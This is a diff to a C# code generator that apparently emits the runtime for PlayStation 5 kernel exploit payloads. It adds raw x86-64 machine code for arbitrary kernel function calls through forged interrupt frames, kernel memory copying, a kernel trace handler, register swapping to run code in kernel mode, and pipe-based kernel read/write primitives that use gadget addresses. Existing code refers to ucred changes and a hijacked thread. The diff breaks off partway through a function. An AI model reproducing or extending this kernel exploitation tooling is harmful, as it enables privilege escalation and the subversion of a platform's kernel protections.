@@ -59,6 +59,15 @@ public static class PayloadCrtEmitter
     /// clean ELF with zero breadcrumb bytes.</summary>
     public static bool EmitDiagnosticBreadcrumbs { get; set; }
 
+    /// <summary>
+    /// When set, <c>_start</c> returns to the caller after <c>__managed__Main</c> returns
+    /// instead of terminating the thread via <c>SYS_thr_exit</c>. This matches a tail-call
+    /// pattern (<c>jmp main</c> in assembly): main's <c>ret</c> returns to the loader that
+    /// mapped this payload. Used for separately-mapped payloads where the caller expects
+    /// control back after the entry function completes.
+    /// </summary>
+    public static bool ReturnOnExit { get; set; }
+
     private const int ShtProgBits = 1, ShtSymTab = 2, ShtStrTab = 3, ShtRela = 4, ShtNoBits = 8;
     private const ulong ShfAlloc = 0x2, ShfWrite = 0x1, ShfExec = 0x4;
     private const byte GlobalFunc = (1 << 4) | 2;
@@ -183,6 +192,84 @@ public static class PayloadCrtEmitter
     /// <summary>Kernel copyout primitive. Overwrites the pipe struct via <c>kernel_write</c>,
     /// then <c>SYS_read(rwpipe[0], uaddr, len)</c>.</summary>
     public const string KernelCopyoutSymbol = "__sp_kernel_copyout";
+
+    /// <summary>Kernel function call via INT 9. Builds kframe and uretframe in kernel memory,
+    /// loads arguments into registers, and executes INT 9.</summary>
+    public const string KfncallSymbol = "__sp_kfncall";
+
+    /// <summary>Kernel memory copy via INT 0xB3. Takes (rdi=dst, rsi=src, rdx=len).</summary>
+    public const string KmemcpySymbol = "__sp_kmemcpy";
+
+    /// <summary>Trace interrupt handler: saves all registers, snapshots kframe state to the
+    /// trace ring buffer, optionally calls <see cref="TraceProgSymbol"/>, restores registers
+    /// and returns to kernel mode via INT 9.</summary>
+    public const string Ret2traceSymbol = "__sp_ret2trace";
+
+    /// <summary>Runs a function in kernel mode: saves the current register state to kframe
+    /// via copyin, swaps with kernel-mode values, fires INT 9, then restores the original
+    /// state via copyout.</summary>
+    public const string RunInKernelSymbol = "__sp_run_in_kernel";
+    public const string ClearTfHandlerSymbol = "__sp_clear_tf_handler";
+    public const string GetClearTfHandlerSymbol = "__sp_get_clear_tf_handler";
+    public const string SetTfSymbol = "__sp_set_tf";
+    public const string TraceInitSymbol = "__sp_trace_init";
+    public const string TraceSetProgSymbol = "__sp_trace_set_prog";
+    public const string GetRet2traceSymbol = "__sp_get_ret2trace";
+    /// <summary>Returns the address of the <c>.int1_return</c> label inside
+    /// <see cref="RunInKernelSymbol"/>. Used to pre-seed the uretframe with a
+    /// valid user-mode return address before firing INT 9, matching r0run.asm's
+    /// <c>lea rax, [rel .int1_return]; push rax</c> sequence.</summary>
+    public const string GetInt1ReturnSymbol = "__sp_get_int1_return";
+    public const string SetTfAndGetpidSymbol = "__sp_set_tf_and_getpid";
+
+    /// <summary>Creates a fresh pipe via SYS_pipe(42), capturing both return
+    /// registers (RAX=read fd, RDX=write fd) into the caller's int[2] buffer.</summary>
+    public const string PipeSymbol = "__sp_pipe";
+
+    /// <summary>Reinitialises the three pipe-related CRT BSS globals
+    /// (<see cref="PipeAddrSymbol"/>, <see cref="RwPipe0Symbol"/>,
+    /// <see cref="RwPipe1Symbol"/>) with caller-supplied values so that subsequent
+    /// kernel-read/write primitives use the new pipe.</summary>
+    public const string PipeReinitSymbol = "__sp_pipe_reinit";
+
+    /// <summary>CRT assembly version of the getpid-to-fncall trace callback,
+    /// replacing the managed [UnmanagedCallersOnly] callback that has reverse
+    /// P/Invoke GC transitions incompatible with the trace stack.</summary>
+    public const string GetpidToFncallSymbol = "__sp_getpid_to_fncall";
+
+    /// <summary>Initialises the fncall BSS globals from managed code:
+    /// (rdi=cpu_switch, rsi=sys_getpid, rdx=syscall_after, rcx=fncall_fn,
+    ///  r8=args0..5 packed, r9=ans_ptr, stack[0]=nop_ret, stack[1]=doreti_iret).</summary>
+    public const string FncallInitSymbol = "__sp_fncall_init";
+    public const string FncallInitCoreSymbol = "__sp_fncall_init_core";
+
+    /// <summary>Returns the current value of the fncall_ans BSS global (RAX).</summary>
+    public const string GetFncallAnsSymbol = "__sp_get_fncall_ans";
+
+    /// <summary>Sets fncall_fn and fncall_arg0..5 BSS globals:
+    /// (rdi=fn, rsi=a0, rdx=a1, rcx=a2, r8=a3, r9=a4, stack[0]=a5).</summary>
+    public const string SetFncallArgsSymbol = "__sp_set_fncall_args";
+
+    /// <summary>Returns the address of __sp_getpid_to_fncall (LEA, for use with trace_set_prog).</summary>
+    public const string GetFncallCallbackSymbol = "__sp_get_fncall_callback";
+
+    /// <summary>BSS slot holding the kernel address of the kframe IRET save area (8 bytes).</summary>
+    public const string KframeSymbol = "__sp_kframe";
+
+    /// <summary>BSS slot holding the kernel address of the uretframe IRET return area (8 bytes).</summary>
+    public const string UretframeSymbol = "__sp_uretframe";
+
+    /// <summary>BSS slot holding the trace buffer write pointer (8 bytes).</summary>
+    public const string TraceStartSymbol = "__sp_trace_start";
+
+    /// <summary>BSS slot holding the trace buffer end pointer (8 bytes).</summary>
+    public const string TraceEndSymbol = "__sp_trace_end";
+
+    /// <summary>BSS slot holding the function pointer to the trace callback (8 bytes).</summary>
+    public const string TraceProgSymbol = "__sp_trace_prog";
+
+    /// <summary>BSS slot holding the trace snapshot size, typically 168 (8 bytes).</summary>
+    public const string TraceFrameSizeSymbol = "__sp_trace_frame_size";
 
     /// <summary>Kernel init: latches <c>rwpair</c>, <c>rwpipe</c>, <c>pipe_addr</c>,
     /// <c>kdata_base</c> from the arguments block, queries the firmware version via
@@ -750,6 +837,7 @@ public static class PayloadCrtEmitter
         KernelWriteSymbol,
         KernelCopyinSymbol,
         KernelCopyoutSymbol,
+        KfncallSymbol,
         KernelInitSymbol,
         PipeAddrSymbol,
         RwPipe0Symbol,
@@ -907,6 +995,26 @@ public static class PayloadCrtEmitter
         KernelSetUcredNgroupsSymbol,
         KernelSetUcredSceAttr0Symbol,
         DladdrSymbol,
+        KmemcpySymbol,
+        Ret2traceSymbol,
+        RunInKernelSymbol,
+        SetTfSymbol,
+        TraceInitSymbol,
+        TraceSetProgSymbol,
+        GetRet2traceSymbol,
+        GetInt1ReturnSymbol,
+        SetTfAndGetpidSymbol,
+        KframeSymbol,
+        UretframeSymbol,
+        TraceStartSymbol,
+        TraceEndSymbol,
+        TraceProgSymbol,
+        TraceFrameSizeSymbol,
+        PipeSymbol,
+        PipeReinitSymbol,
+        ClearTfHandlerSymbol,
+        GetClearTfHandlerSymbol,
+        FncallInitCoreSymbol,
     ];
 
     /// <summary>The plain C name whose address the pthread priming path asks the cached dlsym
@@ -1420,7 +1528,49 @@ public static class PayloadCrtEmitter
     private const int BssOffNataotTcb = 640;
     private const int BssOffSavedFsbase = 1408;
     private const int BssOffSavedRetaddr = 1416;
-    private const int BssTotalSize = 1424;
+    //  1424     8    __sp_kframe               (kernel address of kframe IRET save area)
+    //  1432     8    __sp_uretframe            (kernel address of uretframe IRET return area)
+    //  1440     8    __sp_trace_start          (trace buffer write pointer)
+    //  1448     8    __sp_trace_end            (trace buffer end pointer)
+    //  1456     8    __sp_trace_prog           (function pointer to trace callback)
+    //  1464     8    __sp_trace_frame_size     (trace snapshot size, typically 168)
+    private const int BssOffKframe = 1424;
+    private const int BssOffUretframe = 1432;
+    private const int BssOffTraceStart = 1440;
+    private const int BssOffTraceEnd = 1448;
+    private const int BssOffTraceProg = 1456;
+    private const int BssOffTraceFrameSize = 1464;
+
+    // ---- BSS data symbols for the CRT fncall subsystem ----
+    // Replaces the managed statics that were in Kfncall.cs — these are written
+    // by __sp_fncall_init and __sp_set_fncall_args, read by __sp_getpid_to_fncall.
+    //  1472     8    __sp_fncall_cpu_switch      (kernel address of cpu_switch)
+    //  1480     8    __sp_fncall_sys_getpid       (kernel address of sys_getpid handler)
+    //  1488     8    __sp_fncall_syscall_after    (kernel address of syscall return path)
+    //  1496     8    __sp_fncall_fn               (target kernel function address)
+    //  1504     8    __sp_fncall_arg0
+    //  1512     8    __sp_fncall_arg1
+    //  1520     8    __sp_fncall_arg2
+    //  1528     8    __sp_fncall_arg3
+    //  1536     8    __sp_fncall_arg4
+    //  1544     8    __sp_fncall_arg5
+    //  1552     8    __sp_fncall_ans              (captured return value from target function)
+    //  1560     8    __sp_fncall_nop_ret          (kernel nop;ret gadget address)
+    //  1568     8    __sp_fncall_doreti_iret      (kernel doreti_iret gadget address)
+    private const int BssOffFncallCpuSwitch = 1472;
+    private const int BssOffFncallSysGetpid = 1480;
+    private const int BssOffFncallSyscallAfter = 1488;
+    private const int BssOffFncallFn = 1496;
+    private const int BssOffFncallArg0 = 1504;
+    private const int BssOffFncallArg1 = 1512;
+    private const int BssOffFncallArg2 = 1520;
+    private const int BssOffFncallArg3 = 1528;
+    private const int BssOffFncallArg4 = 1536;
+    private const int BssOffFncallArg5 = 1544;
+    private const int BssOffFncallAns = 1552;
+    private const int BssOffFncallNopRet = 1560;
+    private const int BssOffFncallDoretiIret = 1568;
+    private const int BssTotalSize = 1576;
 
     // ---- Payload library descriptor struct offsets (0x480 bytes total) ----
     private const int PayloadLibSymtab = 0x468;
@@ -1460,6 +1610,14 @@ public static class PayloadCrtEmitter
         _ucredRelocs = [];
         _mdbgRelocs = [];
         _procioRelocs = [];
+        _kmemcpyRelocs = [];
+        _ret2traceRelocs = [];
+        _runInKernelRelocs = [];
+        _traceInitRelocs = [];
+        _traceSetProgRelocs = [];
+        _setTfAndGetpidRelocs = [];
+        _pipeRelocs = [];
+        _pipeReinitRelocs = [];
         _currentRelocs = _startRelocs;
 
         void AddRel(RelocSymbol sym, int at, long addend = -4) => _currentRelocs.Add(new Reloc(at, sym, RPc32, addend));
@@ -1504,12 +1662,6 @@ public static class PayloadCrtEmitter
         // push rbp ; mov rbp, rsp
         b.AddRange([0x55, 0x48, 0x89, 0xE5]);
 
-        // Save the loader return address into BSS before any CRT init can corrupt
-        // the stack slot. The terminate epilogue writes it back just before ret.
-        b.AddRange([0x48, 0x8B, 0x45, 0x08]);                   // mov rax, [rbp+8]
-        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);             // mov [rip+__sp_saved_retaddr], rax
-        AddRel(RelocSymbol.SavedRetaddr, b.Count - 4);
-
         // push r15 ; push r14 ; push r13 ; push r12 ; push rbx ; sub rsp, 8
         b.AddRange([0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x48, 0x83, 0xEC, 0x08]);
         // mov rbx, rdi
@@ -1529,6 +1681,13 @@ public static class PayloadCrtEmitter
         b.AddRange([0xEB, (byte)((sbyte)(bssLoop - (b.Count + 1) - 1) & 0xFF)]); // jmp .Lbss_loop
         int bssDone = b.Count;
         b[bssDoneJmpAt] = (byte)(bssDone - (bssDoneJmpAt + 1));
+
+        // Save the loader return address into BSS AFTER BSS clear so the
+        // zero-fill does not clobber it. [rbp+8] is still valid here because
+        // the callee-saved pushes go below rbp.
+        b.AddRange([0x48, 0x8B, 0x45, 0x08]);                   // mov rax, [rbp+8]
+        b.AddRange([0x48, 0x89, 0x05, 0, 0, 0, 0]);             // mov [rip+__sp_saved_retaddr], rax
+        AddRel(RelocSymbol.SavedRetaddr, b.Count - 4);
 
         // ---- Save args to BSS ----
         b.AddRange([0x48, 0x89, 0x1D, 0, 0, 0, 0]);                 // mov [rip+payload_args], rbx
@@ -1562,6 +1721,8 @@ public static class PayloadCrtEmitter
         int bcIsthreadedFailLeaAt = -1, bcIsthreadedFailCallDisp = -1;
         int bcPayloadRunEnterLeaAt = -1, bcPayloadRunEnterCallDisp = -1;
         int bcMainExitLeaAt = -1, bcMainExitCallDisp = -1;
+        int bcMainRetOkLeaAt = -1, bcMainRetOkCallDisp = -1;
+        int bcMainRetFailLeaAt = -1, bcMainRetFailCallDisp = -1;
         int bcPayloadTerminateLeaAt = -1, bcPayloadTerminateCallDisp = -1;
 
         // sp:crt:enter (ptr_syscall is 0 at this point; klog returns without emitting)
@@ -2068,6 +2229,27 @@ public static class PayloadCrtEmitter
         int relMain = b.Count - 4;
         _startRelocs.Add(new Reloc(relMain, RelocSymbol.Main, RPlt32, -4));
 
+        // sp:main:ret:0 / sp:main:ret:err — log which value main returned
+        if (EmitDiagnosticBreadcrumbs)
+        {
+            b.AddRange([0x50]);                                       // push rax (save return value)
+            b.AddRange([0x48, 0x83, 0xEC, 0x08]);                     // sub rsp, 8 (16-byte align)
+            b.AddRange([0x85, 0xC0]);                                 // test eax, eax
+            b.AddRange([0x75, 0x09]);                                 // jnz +9 (.Lret_fail)
+            b.AddRange([0x48, 0x8D, 0x3D, 0, 0, 0, 0]);              // lea rdi, [rip+sp_main_ret_ok]
+            bcMainRetOkLeaAt = b.Count - 4;
+            b.AddRange([0xEB, 0x07]);                                 // jmp +7 (.Lret_log)
+            // .Lret_fail:
+            b.AddRange([0x48, 0x8D, 0x3D, 0, 0, 0, 0]);              // lea rdi, [rip+sp_main_ret_err]
+            bcMainRetFailLeaAt = b.Count - 4;
+            // .Lret_log:
+            b.AddRange([0xE8, 0, 0, 0, 0]);                          // call __prospero_klog
+            bcMainRetOkCallDisp = b.Count - 4;
+            bcMainRetFailCallDisp = bcMainRetOkCallDisp;              // same call site
+            b.AddRange([0x48, 0x83, 0xC4, 0x08]);                     // add rsp, 8 (undo align)
+            b.AddRange([0x58]);                                       // pop rax (restore return value)
+        }
+
         // *payloadout = main return
         b.AddRange([0x48, 0x8B, 0x0D, 0, 0, 0, 0]);                 // mov rcx, [rip+payload_args]
         AddRel(RelocSymbol.PayloadArgs, b.Count - 4);
@@ -2164,21 +2346,32 @@ public static class PayloadCrtEmitter
         restoreFsbaseSyscallCallDisp = b.Count - 4;
         b.AddRange([0x48, 0x83, 0xC4, 0x08]);                       // add rsp, 8         (unpush)
 
-        // Terminate the calling thread via SYS_thr_exit(NULL). This kills only the hijacked
-        // thread; the host process continues with its remaining threads. The previous ret-based
-        // path was broken: the loader return address (0x4000ab) contains byte 0x61 which is an
-        // undefined opcode in x86-64 long mode, causing SIGILL. SYS_exit (syscall 1) would kill
-        // the entire process and force a heavyweight restart. SYS_thr_exit (syscall 431 / 0x1AF)
-        // is the correct primitive: it terminates only the calling thread, and when the last thread
-        // exits the kernel internally calls exit1(). The NULL argument means no state notification.
-        // The exit-code slot the loader hands us at args[0x28] carries the value the loader reads
-        // to learn whether the payload ran; main's return value has already been written there
-        // before this label is reached.
-        b.AddRange([0x31, 0xF6]);                                   // xor esi, esi        (arg1 = NULL)
-        b.AddRange([0xBF, 0xAF, 0x01, 0x00, 0x00]);                 // mov edi, 0x1AF      (sysno = SYS_thr_exit = 431)
-        b.AddRange([0xE8, 0, 0, 0, 0]);                             // call __sp_crt_syscall
-        thrExitSyscallCallDisp = b.Count - 4;
-        b.AddRange([0x0F, 0x0B]);                                   // ud2                 (unreachable)
+        if (ReturnOnExit)
+        {
+            // Unwind prologue: push rbp; push r15..r12; push rbx; sub rsp,8
+            b.AddRange([0x48, 0x83, 0xC4, 0x08]);                   // add rsp, 8
+            b.AddRange([0x5B]);                                      // pop rbx
+            b.AddRange([0x41, 0x5C]);                                // pop r12
+            b.AddRange([0x41, 0x5D]);                                // pop r13
+            b.AddRange([0x41, 0x5E]);                                // pop r14
+            b.AddRange([0x41, 0x5F]);                                // pop r15
+            b.AddRange([0x48, 0x8B, 0x05, 0, 0, 0, 0]);             // mov rax, [rip+__sp_saved_retaddr]
+            AddRel(RelocSymbol.SavedRetaddr, b.Count - 4);
+            b.AddRange([0x48, 0x89, 0x44, 0x24, 0x08]);             // mov [rsp+8], rax
+            b.AddRange([0x5D]);                                      // pop rbp
+            b.AddRange([0xC3]);                                      // ret
+            thrExitSyscallCallDisp = -1;
+        }
+        else
+        {
+            // Terminate the calling thread via SYS_thr_exit(NULL). This kills only the hijacked
+            // thread; the host process continues with its remaining threads.
+            b.AddRange([0x31, 0xF6]);                                   // xor esi, esi        (arg1 = NULL)
+            b.AddRange([0xBF, 0xAF, 0x01, 0x00, 0x00]);                 // mov edi, 0x1AF      (sysno = SYS_thr_exit = 431)
+            b.AddRange([0xE8, 0, 0, 0, 0]);                             // call __sp_crt_syscall
+            thrExitSyscallCallDisp = b.Count - 4;
+            b.AddRange([0x0F, 0x0B]);                                   // ud2                 (unreachable)
+        }
 
         int startEnd = b.Count;
         _startBytes = startEnd - startOff;
@@ -9969,7 +10162,8 @@ public static class PayloadCrtEmitter
         WriteDispFrom(saveFsbaseSyscallCallDisp, crtSyscallOff);
         WriteDispFrom(tcbSetSyscallCallDisp, crtSyscallOff);
         WriteDispFrom(restoreFsbaseSyscallCallDisp, crtSyscallOff);
-        WriteDispFrom(thrExitSyscallCallDisp, crtSyscallOff);
+        if (thrExitSyscallCallDisp >= 0)
+            WriteDispFrom(thrExitSyscallCallDisp, crtSyscallOff);
         WriteDispFrom(startCallKernelInitDisp, kernelInitOff);
         WriteDispFrom(startCallKlogInitDisp, klogInitOff);
         WriteDispFrom(isthreadedDlsymDisp, kernelDynlibDlsymOff);
@@ -9999,6 +10193,7 @@ public static class PayloadCrtEmitter
             WriteDispFrom(bcIsthreadedOkCallDisp, klogOff);
             WriteDispFrom(bcIsthreadedFailCallDisp, klogOff);
             WriteDispFrom(bcPayloadRunEnterCallDisp, klogOff);
+            WriteDispFrom(bcMainRetOkCallDisp, klogOff);
             WriteDispFrom(bcMainExitCallDisp, klogOff);
             WriteDispFrom(bcPayloadTerminateCallDisp, klogOff);
             // RTLD subsystem init checkpoint klog calls
@@ -11890,6 +12085,642 @@ public static class PayloadCrtEmitter
         _kernelSetUcredNgroupsOff = setUcredNgroupsOff;
         _kernelSetUcredSceAttr0Off = setUcredSceAttr0Off;
 
+        // ---- __sp_kfncall ----
+        // long __sp_kfncall(fn, a1, a2, a3, a4, a5, a6, kframeKva, uretframeKva, kstackKva)
+        // Builds kframe/uretframe in kernel memory via copyin, loads args, fires INT 9.
+        int kfncallOff = b.Count;
+        b.AddRange([0x55]);                                              // push rbp
+        b.AddRange([0x48, 0x89, 0xE5]);                                  // mov rbp, rsp
+        b.AddRange([0x53]);                                              // push rbx
+        b.AddRange([0x41, 0x54]);                                        // push r12
+        b.AddRange([0x41, 0x55]);                                        // push r13
+        b.AddRange([0x41, 0x56]);                                        // push r14
+        b.AddRange([0x41, 0x57]);                                        // push r15
+        b.AddRange([0x48, 0x83, 0xEC, 0x58]);                            // sub rsp, 0x58
+        // Save register args to callee-saved regs
+        b.AddRange([0x48, 0x89, 0xFB]);                                  // mov rbx, rdi   (fn)
+        b.AddRange([0x49, 0x89, 0xF4]);                                  // mov r12, rsi   (a1)
+        b.AddRange([0x49, 0x89, 0xD5]);                                  // mov r13, rdx   (a2)
+        b.AddRange([0x49, 0x89, 0xCE]);                                  // mov r14, rcx   (a3)
+        b.AddRange([0x4D, 0x89, 0xC7]);                                  // mov r15, r8    (a4)
+        b.AddRange([0x4C, 0x89, 0x4D, 0xD0]);                            // mov [rbp-0x30], r9  (a5)
+        // Build kframe at [rbp-0x58]: {fn, 0x20, 0x02, kstackKva, 0x00}
+        b.AddRange([0x48, 0x89, 0x5D, 0xA8]);                            // mov [rbp-0x58], rbx
+        b.AddRange([0x48, 0xC7, 0x45, 0xB0, 0x20, 0x00, 0x00, 0x00]);   // mov qword [rbp-0x50], 0x20
+        b.AddRange([0x48, 0xC7, 0x45, 0xB8, 0x02, 0x00, 0x00, 0x00]);   // mov qword [rbp-0x48], 0x02
+        b.AddRange([0x48, 0x8B, 0x45, 0x28]);                            // mov rax, [rbp+0x28] (kstackKva)
+        b.AddRange([0x48, 0x89, 0x45, 0xC0]);                            // mov [rbp-0x40], rax
+        b.AddRange([0x48, 0xC7, 0x45, 0xC8, 0x00, 0x00, 0x00, 0x00]);   // mov qword [rbp-0x38], 0x00
+        // copyin(&kframe_local, kframeKva, 40)
+        b.AddRange([0x48, 0x8D, 0x7D, 0xA8]);                            // lea rdi, [rbp-0x58]
+        b.AddRange([0x48, 0x8B, 0x75, 0x18]);                            // mov rsi, [rbp+0x18] (kframeKva)
+        b.AddRange([0xBA, 0x28, 0x00, 0x00, 0x00]);                      // mov edx, 40
+        EmitCallCopyin();
+        // Build uretframe at [rbp-0x80]: {.Lint1_return, 0x43, 0x10202, rsp, 0x3B}
+        b.AddRange([0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00]);          // lea rax, [rip+.Lint1_return]
+        int kfncallLint1LeaAt = b.Count - 4;
+        b.AddRange([0x48, 0x89, 0x45, 0x80]);                            // mov [rbp-0x80], rax
+        b.AddRange([0x48, 0xC7, 0x45, 0x88, 0x43, 0x00, 0x00, 0x00]);   // mov qword [rbp-0x78], 0x43
+        b.AddRange([0x48, 0xC7, 0x45, 0x90, 0x02, 0x02, 0x01, 0x00]);   // mov qword [rbp-0x70], 0x10202
+        b.AddRange([0x48, 0x89, 0x65, 0x98]);                            // mov [rbp-0x68], rsp
+        b.AddRange([0x48, 0xC7, 0x45, 0xA0, 0x3B, 0x00, 0x00, 0x00]);   // mov qword [rbp-0x60], 0x3B
+        // copyin(&uretframe_local, uretframeKva, 40)
+        b.AddRange([0x48, 0x8D, 0x7D, 0x80]);                            // lea rdi, [rbp-0x80]
+        b.AddRange([0x48, 0x8B, 0x75, 0x20]);                            // mov rsi, [rbp+0x20] (uretframeKva)
+        b.AddRange([0xBA, 0x28, 0x00, 0x00, 0x00]);                      // mov edx, 40
+        EmitCallCopyin();
+        // Load a1-a6 for the kernel function
+        b.AddRange([0x4C, 0x89, 0xE7]);                                  // mov rdi, r12  (a1)
+        b.AddRange([0x4C, 0x89, 0xEE]);                                  // mov rsi, r13  (a2)
+        b.AddRange([0x4C, 0x89, 0xF2]);                                  // mov rdx, r14  (a3)
+        b.AddRange([0x4C, 0x89, 0xF9]);                                  // mov rcx, r15  (a4)
+        b.AddRange([0x4C, 0x8B, 0x45, 0xD0]);                            // mov r8, [rbp-0x30] (a5)
+        b.AddRange([0x4C, 0x8B, 0x4D, 0x10]);                            // mov r9, [rbp+0x10] (a6)
+        // INT 9: enter kernel mode
+        b.AddRange([0xCD, 0x09]);                                         // int 9
+        // .Lint1_return: RAX has the kernel function's return value
+        int kfncallLint1ReturnOff = b.Count;
+        // Epilog
+        b.AddRange([0x48, 0x83, 0xC4, 0x58]);                            // add rsp, 0x58
+        b.AddRange([0x41, 0x5F]);                                        // pop r15
+        b.AddRange([0x41, 0x5E]);                                        // pop r14
+        b.AddRange([0x41, 0x5D]);                                        // pop r13
+        b.AddRange([0x41, 0x5C]);                                        // pop r12
+        b.AddRange([0x5B]);                                              // pop rbx
+        b.AddRange([0x5D]);                                              // pop rbp
+        b.AddRange([0xC3]);                                              // ret
+        _kfncallOff = kfncallOff;
+        _kfncallBytes = b.Count - kfncallOff;
+        WriteDispFrom(kfncallLint1LeaAt, kfncallLint1ReturnOff);
+
+        // ---- __sp_kmemcpy ----
+        // void __sp_kmemcpy(rdi=dst, rsi=src, rdx=len)
+        // 12 bytes, no relocations. Raw kernel-memory copy via INT 0xB3.
+        int kmemcpyOff = b.Count;
+        _currentRelocs = _kmemcpyRelocs;
+        b.AddRange([0x48, 0x89, 0xD1, 0x48, 0x89, 0xE8, 0xCD, 0xB3, 0x48, 0x89, 0xC5, 0xC3]);
+        _kmemcpyOff = kmemcpyOff;
+        _kmemcpyBytes = b.Count - kmemcpyOff;
+
+        // ---- __sp_ret2trace ----
+        // Trace interrupt handler: saves all registers, snapshots kframe state to the
+        // trace ring buffer, optionally calls trace_prog, restores and returns via INT 9.
+        // 184 bytes, 9 BSS relocations + 2 intra-section calls to __sp_kmemcpy.
+        int ret2traceOff = b.Count;
+        _currentRelocs = _ret2traceRelocs;
+        b.AddRange([65,87,65,86,65,85,65,84,65,83,65,82,65,81,65,80,87,86,85,106,0,83,82,81,80,
+            72,131,236,40,72,137,231,72,139,53,0,0,0,0,186,40,0,0,0,232,0,0,0,0,185,168,0,0,0,
+            72,139,5,0,0,0,0,72,57,200,72,15,66,200,72,139,5,0,0,0,0,72,43,5,0,0,0,0,72,57,200,
+            72,15,66,200,72,139,61,0,0,0,0,72,137,230,243,164,72,137,61,0,0,0,0,128,76,36,18,1,
+            72,131,61,0,0,0,0,0,116,11,72,137,231,85,255,21,0,0,0,0,93,72,139,61,0,0,0,0,72,137,
+            230,186,40,0,0,0,232,0,0,0,0,72,131,196,40,88,89,90,91,93,93,94,95,65,88,65,89,65,90,
+            65,91,65,92,65,93,65,94,65,95,205,9]);
+        // BSS relocations (RIP-relative references to trace globals)
+        AddRel(RelocSymbol.Kframe, ret2traceOff + 35);
+        AddRel(RelocSymbol.TraceFrameSize, ret2traceOff + 57);
+        AddRel(RelocSymbol.TraceEnd, ret2traceOff + 71);
+        AddRel(RelocSymbol.TraceStart, ret2traceOff + 78);
+        AddRel(RelocSymbol.TraceStart, ret2traceOff + 92);
+        AddRel(RelocSymbol.TraceStart, ret2traceOff + 104);
+        AddRel(RelocSymbol.TraceProg, ret2traceOff + 116);
+        AddRel(RelocSymbol.TraceProg, ret2traceOff + 129);
+        AddRel(RelocSymbol.Kframe, ret2traceOff + 137);
+        // Intra-section calls to __sp_kmemcpy (E8 rel32)
+        kernelCallDisps.Add((ret2traceOff + 45, "kmemcpy"));
+        kernelCallDisps.Add((ret2traceOff + 150, "kmemcpy"));
+        _ret2traceOff = ret2traceOff;
+        _ret2traceBytes = b.Count - ret2traceOff;
+
+        // ---- __sp_run_in_kernel ----
+        // Runs a function in kernel mode: saves register state to kframe via copyin,
+        // swaps registers with kernel-mode values, fires INT 9, restores via copyout.
+        // 302 bytes, 3 BSS relocations + 3 intra-section calls (2x copyin, 1x copyout).
+        // Internal LEA at offset 17 (lea rax, [rip+142]) targets .int1_return at offset 165;
+        // displacement 142 is correct in the byte array (142 = 165 - 17 - 6).
+        int runInKernelOff = b.Count;
+        _currentRelocs = _runInKernelRelocs;
+        b.AddRange([80,87,72,137,224,106,59,80,104,2,2,1,0,106,67,72,141,5,142,0,0,0,80,72,139,
+            61,0,0,0,0,72,137,230,72,199,194,40,0,0,0,232,0,0,0,0,72,131,196,40,72,139,60,36,
+            106,0,255,119,56,139,135,136,0,0,0,80,106,32,255,183,128,0,0,0,72,139,61,0,0,0,0,72,
+            137,230,72,199,194,40,0,0,0,232,0,0,0,0,72,131,196,40,72,139,60,36,72,135,7,72,135,
+            79,16,72,135,87,24,72,135,95,8,72,135,111,48,72,135,119,32,76,135,71,64,76,135,79,72,
+            76,135,87,80,76,135,95,88,76,135,103,96,76,135,111,104,76,135,119,112,76,135,127,120,
+            72,139,127,40,205,9,72,135,60,36,72,135,7,72,135,79,16,72,135,87,24,72,135,95,8,72,
+            135,111,48,72,135,119,32,72,139,4,36,72,137,71,40,76,135,71,64,76,135,79,72,76,135,87,
+            80,76,135,95,88,76,135,103,96,76,135,111,104,76,135,119,112,76,135,127,120,72,137,60,
+            36,72,131,236,40,72,137,231,72,139,53,0,0,0,0,72,199,194,40,0,0,0,232,0,0,0,0,72,139,
+            124,36,40,72,139,4,36,72,137,135,128,0,0,0,72,139,68,36,16,137,135,136,0,0,0,72,139,
+            68,36,24,72,137,71,56,72,131,196,56,195]);
+        // BSS relocations (RIP-relative references to trace globals)
+        AddRel(RelocSymbol.Uretframe, runInKernelOff + 26);
+        AddRel(RelocSymbol.Kframe, runInKernelOff + 76);
+        AddRel(RelocSymbol.Kframe, runInKernelOff + 245);
+        // Intra-section calls to copyin/copyout (E8 rel32)
+        // run_in_kernel's copyin convention is copyin(dst_kernel, src_user, len)
+        // but our CRT copyin uses (src_user, dst_kernel, len) — arguments are SWAPPED.
+        // Route through wrapper functions that swap rdi/rsi before calling the real function.
+        kernelCallDisps.Add((runInKernelOff + 41, "copyin_r0"));
+        kernelCallDisps.Add((runInKernelOff + 91, "copyin_r0"));
+        kernelCallDisps.Add((runInKernelOff + 257, "copyout_r0"));
+        _runInKernelOff = runInKernelOff;
+        _runInKernelBytes = b.Count - runInKernelOff;
+
+        // ---- Wrappers: swap rdi/rsi to bridge kernel-trace ↔ CRT argument conventions ----
+        // kernel-trace copyin(dst_kernel, src_user, len) → CRT copyin(src_user, dst_kernel, len)
+        int copyinR0Off = b.Count;
+        b.AddRange([0x48, 0x87, 0xFE]);   // xchg rsi, rdi (swap first two args)
+        b.AddRange([0xE8, 0, 0, 0, 0]);   // call __sp_kernel_copyin
+        kernelCallDisps.Add((b.Count - 4, "copyin"));
+        b.Add(0xC3);                        // ret
+        _copyinR0Off = copyinR0Off;
+
+        // kernel-trace copyout(dst_user, src_kernel, len) → CRT copyout(src_kernel, dst_user, len)
+        int copyoutR0Off = b.Count;
+        b.AddRange([0x48, 0x87, 0xFE]);   // xchg rsi, rdi
+        b.AddRange([0xE8, 0, 0, 0, 0]);   // call __sp_kernel_copyout
+        kernelCallDisps.Add((b.Count - 4, "copyout"));
+        b.Add(0xC3);                        // ret
+        _copyoutR0Off = copyoutR0Off;
+
+        // ---- __sp_clear_tf_handler ----
+        // SIGTRAP signal handler: clears TF (bit 8) from signal context rflags.
+        // Called with (int sig, siginfo_t* info, ucontext_t* uc).
+        // uc + 16 (uc_mcontext) + 48 (PS5 shift) + 176 (mc_rflags) = uc + 240.
+        // and qword [rdx + 0xF0], 0xFFFFFEFF (= -257, clears bit 8); ret
+        int clearTfHandlerOff = b.Count;
+        b.AddRange([0x48, 0x81, 0xA2, 0xF0, 0x00, 0x00, 0x00, 0xFF, 0xFE, 0xFF, 0xFF, 0xC3]);
+        _clearTfHandlerOff = clearTfHandlerOff;
+        _clearTfHandlerBytes = b.Count - clearTfHandlerOff;
+
+        // ---- __sp_get_clear_tf_handler ----
+        // Returns the address of __sp_clear_tf_handler for sigaction.
+        // lea rax, [rip + clearTfHandler]; ret
+        int getClearTfHandlerOff = b.Count;
+        b.AddRange([0x48, 0x8D, 0x05, 0, 0, 0, 0, 0xC3]);
